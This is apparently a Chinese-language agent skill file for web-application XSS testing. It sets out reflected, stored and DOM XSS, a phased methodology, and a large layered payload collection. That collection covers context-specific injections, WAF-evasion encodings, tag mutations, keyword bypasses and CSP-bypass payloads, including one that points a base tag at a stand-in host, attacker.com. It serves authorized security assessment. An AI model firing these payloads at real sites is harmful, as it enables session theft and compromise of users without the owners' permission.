---
name: xss-testing
description: >
  跨站脚本(XSS)漏洞测试技能。覆盖反射型、存储型、DOM型 XSS 的识别与验证方法，
  提供分层 Payload 集合、WAF 绕过策略、编码变换技巧和系统化测试流程，
  适用于 Web 应用安全评估中的 XSS 漏洞发现与确认。
---

# XSS 跨站脚本测试技能

系统化检测和验证 Web 应用中的跨站脚本(XSS)漏洞。
通过分层 Payload 注入、上下文感知的编码变换和响应分析，
定位未经正确过滤/转义的用户输入输出点。

---

## 1. XSS 分类与识别

### 1.1 反射型 XSS (Reflected)

用户输入通过 HTTP 请求参数直接反射到响应页面中。

识别特征：
- URL 参数值出现在 HTML 响应体中
- 搜索框、错误消息、表单回填等场景
- 服务端未对输出进行 HTML 实体编码

测试入口：
- GET/POST 参数
- HTTP Header（Referer、User-Agent、X-Forwarded-For）
- URL 路径段（path segment）
- Fragment 不直接发送到服务端，但可能被 JavaScript 读取

### 1.2 存储型 XSS (Stored)

用户输入被持久化存储，在其他用户访问时触发。

高危存储点：
- 用户评论、留言板、论坛帖子
- 用户个人资料（昵称、签名、头像 URL）
- 文件名（上传文件后展示）
- 日志查看界面（管理后台展示用户输入）
- 邮件内容（Webmail 客户端）

### 1.3 DOM 型 XSS (DOM-based)

前端 JavaScript 直接使用不可信数据操作 DOM。

危险 Sink：
- `document.write()` / `document.writeln()`
- `element.innerHTML` / `element.outerHTML`
- `element.insertAdjacentHTML()`
- `eval()` / `setTimeout(string)` / `setInterval(string)`
- `new Function(string)`
- `location.href` / `location.assign()` / `location.replace()`
- `jQuery.html()` / `jQuery.append()` / `$()`

危险 Source：
- `location.hash` / `location.search` / `location.href`
- `document.referrer`
- `document.cookie`
- `window.name`
- `postMessage` 事件的 `event.data`
- Web Storage（localStorage / sessionStorage）

---

## 2. 测试方法论

### 2.1 第一阶段：输入点枚举

1. 爬取目标站点，收集所有表单、URL 参数、API 端点
2. 识别每个参数在响应中的反射位置
3. 记录反射上下文（HTML body、属性值、JavaScript、CSS、URL）

### 2.2 第二阶段：探测注入

使用无害探针确认反射行为：
```
canary_string_12345
<canary>
"canary"
'canary'
```

分析响应中探针的变化：
- 是否被原样返回
- 是否被 HTML 编码（`<` → `&lt;`）
- 是否被删除或截断
- 是否被 URL 编码
- 上下文位置（标签内容、属性值、脚本块）

### 2.3 第三阶段：上下文适配 Payload

根据探测结果选择对应的 Payload 策略（见第 3 节）。

### 2.4 第四阶段：绕过验证

针对发现的过滤规则，尝试绕过手段（见第 4 节）。

### 2.5 第五阶段：影响评估

成功触发后评估实际影响：
- 能否窃取 Cookie（HttpOnly 标志？）
- 能否发起跨站请求
- 能否读取页面内容（同源策略边界？）
- CSP 策略是否限制内联脚本执行

---

## 3. 分层 Payload 集合

### 3.1 HTML 上下文（标签内容区）

当输入反射在 `<div>`, `<p>`, `<td>` 等标签的文本内容中：

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

### 3.2 HTML 属性上下文

当输入反射在 HTML 属性值中，如 `<input value="USER_INPUT">`：

```html
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) "
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
" style="background:url(javascript:alert(1))
```

如果属性未加引号 `<input value=USER_INPUT>`：

```html
 onfocus=alert(1) autofocus 
 onmouseover=alert(1) 
```

### 3.3 JavaScript 上下文

当输入反射在 `<script>` 块内部，如 `var x = "USER_INPUT"`：

```javascript
";alert(1)//
';alert(1)//
\";alert(1)//
</script><script>alert(1)</script>
```

模板字面量上下文 `` var x = `USER_INPUT` ``：

```javascript
${alert(1)}
```

### 3.4 URL 上下文

当输入反射在 `href` 或 `src` 属性中，如 `<a href="USER_INPUT">`：

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 3.5 CSS 上下文

当输入反射在 `<style>` 或 `style` 属性中：

```css
expression(alert(1))
url(javascript:alert(1))
</style><script>alert(1)</script>
```

---

## 4. WAF 绕过与编码策略

### 4.1 大小写混淆

```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
```

### 4.2 HTML 实体编码

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<a href="javascript&#58;alert(1)">click</a>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
```

### 4.3 Unicode 编码

```javascript
\u0061\u006c\u0065\u0072\u0074(1)
```

### 4.4 标签变形

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<scr%00ipt>alert(1)</script>
<<script>script>alert(1)</script>
```

### 4.5 事件处理器替代

当 `onerror` 被过滤时，使用其他事件：
```html
<svg/onload=alert(1)>
<body/onhashchange=alert(1)>
<input/onfocus=alert(1) autofocus>
<details/open/ontoggle=alert(1)>
<marquee/onstart=alert(1)>
<video/src/onerror=alert(1)>
<isindex type=image src=x onerror=alert(1)>
```

### 4.6 括号替代

当 `()` 被过滤：
```html
<img src=x onerror=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>
<img src=x onerror="window['alert'](1)">
<svg onload="top[/al/.source+/ert/.source](1)">
```

### 4.7 空格替代

```html
<svg/onload=alert(1)>
<svg	onload=alert(1)>
<svg%0aonload=alert(1)>
<svg%0donload=alert(1)>
<svg%09onload=alert(1)>
```

### 4.8 JavaScript 关键字绕过

当 `alert` 被过滤：
```javascript
confirm(1)
prompt(1)
window['al'+'ert'](1)
top[/al/.source+/ert/.source](1)
self['alert'](1)
[]['constructor']['constructor']('return alert(1)')()
```

---

## 5. CSP 绕过参考

### 5.1 常见 CSP 弱点

| CSP 配置 | 绕过方法 |
|----------|---------|
| `script-src 'unsafe-inline'` | 直接内联脚本 |
| `script-src 'unsafe-eval'` | `eval()`, `setTimeout(string)` |
| `script-src cdn.example.com` | 寻找 CDN 上的 JSONP 端点或 Angular 等库 |
| `script-src 'self'` | 寻找同源的文件上传或 JSONP 端点 |
| `script-src 'nonce-xxx'` | 如果 nonce 可预测或在注入点之后生成 |
| `script-src data:` | `<script src="data:text/javascript,alert(1)">` |
| 缺少 `base-uri` | `<base href="https://attacker.com/">` 劫持相对路径 |
| 缺少 `object-src` | `<object data="data:text/html,...">` |

### 5.2 CSP 绕过 Payload

```html
<script nonce="correct-nonce">alert(1)</script>
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//">
<base href="https://attacker.com/"><script src="/legit-path.js"></script>
<object data="data:text/html,<script>alert(1)</script>">
```

---

## 6. 测试检查清单

- [ ] 枚举所有用户输入反射点（URL 参数、表单字段、Header）
- [ ] 确认每个反射点的 HTML 上下文
- [ ] 测试基础 Payload（`<script>alert(1)</script>`）
- [ ] 测试上下文适配 Payload（属性逃逸、JS 逃逸等）
- [ ] 检查服务端过滤规则并尝试绕过
- [ ] 检查 CSP 策略及其可绕过性
- [ ] 检查 Cookie 的 HttpOnly 标志
- [ ] 评估存储型 XSS 的可能性
- [ ] 检查 DOM XSS（分析前端 JS 中的 source-sink 链）
- [ ] 记录所有发现，包含完整的重现步骤
